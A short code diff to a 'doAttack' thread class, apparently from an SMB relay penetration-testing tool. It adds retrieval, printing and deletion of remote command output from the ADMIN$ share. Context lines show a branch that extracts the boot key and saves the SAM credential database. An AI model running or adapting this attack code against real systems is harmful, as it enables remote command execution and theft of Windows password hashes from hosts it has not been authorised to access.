@@ -69,9 +69,12 @@ class doAttack(Thread):
 
         self.__exeFile = exeFile
         self.__command = command
+        self.__answerTMP = ''
         if exeFile is not None:
             self.installService = serviceinstall.ServiceInstall(SMBClient, exeFile)
 
+    def __answer(self, data):
+        self.__answerTMP += data
 
     def run(self):
         # Here PUT YOUR CODE!
@@ -96,6 +99,10 @@ class doAttack(Thread):
                 if self.__command is not None:
                     remoteOps._RemoteOperations__executeRemote(self.__command)
                     logging.info("Executed specified command on host: %s", self.__SMBConnection.getRemoteHost())
+                    self.__answerTMP = ''
+                    self.__SMBConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
+                    print self.__answerTMP
+                    self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\__output')
                 else:
                     bootKey = remoteOps.getBootKey()
                     samFileName = remoteOps.saveSAM()
